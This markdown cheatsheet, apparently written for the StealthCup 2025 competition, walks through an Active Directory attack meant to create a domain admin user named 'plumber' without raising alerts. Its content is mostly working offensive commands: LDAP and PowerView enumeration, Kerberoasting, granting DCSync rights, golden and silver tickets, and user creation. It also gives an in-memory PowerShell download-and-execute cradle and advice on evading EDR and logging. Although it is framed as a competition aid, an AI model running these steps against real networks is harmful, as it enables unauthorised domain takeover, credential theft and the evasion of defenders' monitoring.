# StealthCup 2025: Active Directory Attack Cheatsheet

This cheatsheet provides techniques for attacking the Active Directory environment within StealthCup, focusing on achieving the **Enterprise Cup objective** (create `plumber` user with domain admin rights) while minimizing alerts.

**Prerequisite**: Some level of initial access/credentials obtained via reconnaissance or other means.

## 1. Stealthy AD Enumeration (Post-Credentials)

Once you have credentials (even low-privileged ones), enumerate AD more deeply but carefully.

- **PowerShell-Based Enumeration**: Leverage built-in AD cmdlets or tools like PowerView.
  - **Tools**: `PowerView.ps1`, Native AD cmdlets (`Get-ADUser`, `Get-ADGroup`, etc.)
  - **Example (PowerView - Find Domain Admins)**:
    ```powershell
    # Import PowerView first
    Get-NetGroupMember -GroupName "Domain Admins" -Domain <domain_name>
    ```
  - **Example (Native - Find specific user)**:
    ```powershell
    Get-ADUser -Identity <username> -Properties *
    ```
  - **Evasion Tip**: Run PowerShell commands in memory (`IEX (New-Object Net.WebClient).DownloadString(...)`). Avoid dropping scripts to disk. Use `powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden` for execution. Throttle queries to avoid generating excessive LDAP traffic. Use `-LDAPFilter` for targeted queries instead of fetching all objects.

- **LDAP Queries**: Use tools to perform raw LDAP queries.
  - **Tools**: `ldapsearch` (Linux), `AdFind.exe` (Windows), Python libraries (`ldap3`)
  - **Example (`ldapsearch` - Find Domain Controllers)**:
    ```bash
    ldapsearch -x -H ldap://<dc_ip> -D '<user_dn>' -w '<password>' -b '<base_dn>' '(userAccountControl:1.2.840.113556.1.4.803:=8192)' # Find DCs
    ```
  - **Evasion Tip**: Encrypt LDAP traffic (LDAPS/636 or StartTLS). Authenticate with valid credentials. Avoid overly broad queries.

- **BloodHound**: Excellent for visualizing attack paths but can be noisy during data collection (SharpHound).
  - **Tools**: `SharpHound.ps1` / `SharpHound.exe`, `BloodHound` GUI
  - **Example (SharpHound - Stealthy Collection)**:
    ```powershell
    # Use specific collection methods, avoid full collection initially
    Invoke-BloodHound -CollectionMethod Group,LocalAdmin,Session -Throttle 1000 -Jitter 30
    ```
  - **Evasion Tip**: Use `-Throttle` and `-Jitter` to slow down collection. Run SharpHound in memory. Consider collecting specific data types (`Group`, `Session`, `LocalAdmin`) incrementally rather than `All`. Analyze data offline.

## 2. Privilege Escalation Techniques

Focus on methods less likely to be caught by standard EDR/AV.

- **Kerberoasting**: Request service tickets (TGS) for accounts with SPNs and crack them offline.
  - **Tools**: `GetUserSPNs.py` (impacket), `Rubeus.exe`, `Invoke-Kerberoast.ps1`
  - **Example (impacket)**:
    ```bash
    GetUserSPNs.py <domain_name>/<username>:<password> -request -outputfile kerberoast_hashes.txt
    ```
  - **Evasion Tip**: Request tickets one by one or in small batches. Avoid requesting tickets for highly privileged accounts (like krbtgt) directly if possible. Use valid user credentials.

- **Abusing GPO Permissions**: Look for GPOs you can edit to push malicious settings or scripts.
  - **Tools**: PowerView (`Get-NetGPO`, `Find-GPOComputerAdmin`, `Find-GPOLocation`)
  - **Evasion Tip**: Modify existing GPOs subtly rather than creating new ones. Use fileless payloads in GPO scripts. Target specific OUs.

- **ACL/ACE Abuse**: Find objects where you have modification rights (e.g., `GenericAll`, `WriteDACL`).
  - **Tools**: PowerView (`Get-ObjectAcl`, `Add-ObjectAcl`), `BloodHound` (analyzes paths)
  - **Example (Grant DCSync rights if possible)**:
    ```powershell
    Add-DomainObjectAcl -TargetIdentity "DC=<domain>,DC=<com>" -PrincipalIdentity <your_user> -Rights DCSync
    ```
  - **Evasion Tip**: DCSync rights are heavily monitored. Other less obvious ACL paths might exist (e.g., controlling a user/group that has rights). Modify ACLs carefully and revert if necessary.

- **Unconstrained Delegation Abuse**: If you compromise a server/user with unconstrained delegation, you can capture TGTs.
  - **Tools**: `Rubeus monitor /interval:5`, `Invoke-PowerShellTcp` (to relay session)
  - **Evasion Tip**: Requires compromising a specific type of host. Monitor traffic passively if possible.

- **Password Spraying (Slowly)**: Try 1-2 common passwords against a list of users over a long period.
  - **Tools**: `Spray-Passwords.ps1`, `kerbrute passwordspray`
  - **Evasion Tip**: VERY SLOWLY. Target non-privileged accounts first. Avoid lockout policies (e.g., 1 attempt per user per hour). Use different source IPs if possible.

## 3. Achieving Domain Admin Rights & Creating 'plumber'

- **Golden Ticket (Requires krbtgt hash)**: Create forged TGTs. Highly privileged, highly detected if done improperly.
  - **Tools**: `mimikatz`, `ticketer.py` (impacket)
  - **Evasion Tip**: Obtain `krbtgt` hash via DCSync (if you have rights) or by compromising a DC. Use the ticket immediately and for specific actions. Don't use overly long ticket lifetimes.

- **Silver Ticket (Requires service NTLM hash)**: Create forged TGSs for specific services. Less powerful but potentially stealthier.
  - **Tools**: `mimikatz`, `ticketer.py` (impacket)
  - **Evasion Tip**: Target less critical services first (e.g., CIFS on a specific server).

- **DCSync (Requires specific rights)**: Dump credentials directly from a DC.
  - **Tools**: `mimikatz`, `secretsdump.py` (impacket)
  - **Evasion Tip**: Requires specific AD rights (`Replicating Directory Changes`). Heavily monitored. Perform quickly and ideally from a trusted machine/context if possible.

- **Adding User to Domain Admins**: Once you have sufficient privileges (e.g., control over a DA account, ability to edit DA group membership via ACLs).
  - **Tools**: Native AD cmdlets (`Add-ADGroupMember`), `net group` command
  - **Example (PowerShell)**:
    ```powershell
    Add-ADGroupMember -Identity "Domain Admins" -Members <your_controlled_user_or_plumber>
    ```
  - **Evasion Tip**: Perform this action quickly after gaining necessary privileges. Consider adding to an intermediate group first if DA membership is heavily audited.

- **Creating the 'plumber' User**:
  - **Tools**: Native AD cmdlets (`New-ADUser`), `net user` command
  - **Example (PowerShell)**:
    ```powershell
    # Create user
    New-ADUser -Name "plumber" -SamAccountName "plumber" -AccountPassword (ConvertTo-SecureString "<password>" -AsPlainText -Force) -Enabled $true
    # Add to Domain Admins (requires privileges)
    Add-ADGroupMember -Identity "Domain Admins" -Members "plumber"
    ```
  - **Evasion Tip**: Create the user with minimal attributes initially. Add to DA group as a separate step if needed. Use strong, non-default passwords.

## General Evasion Tips for AD Attacks

- **Least Privilege**: Use the minimum necessary privileges for each action.
- **Credentials**: Avoid plaintext passwords in scripts; use hashes or tokens where possible.
- **Fileless Execution**: Run tools in memory whenever possible.
- **Traffic**: Use encrypted channels (LDAPS, SMB signing/encryption, WinRM HTTPS).
- **Timing**: Blend in with normal business hours or perform actions slowly over time.
- **Cleanup**: Revert ACL changes, remove persistence, clear obvious logs (if absolutely necessary and allowed by rules - check rules carefully!). Rule 16 forbids deleting logs/history.

Always consult the [Alert Evasion Cheatsheet](Alert-Evasion-Cheatsheet.md) and [Scoring System Cheatsheet](Scoring-System-Cheatsheet.md).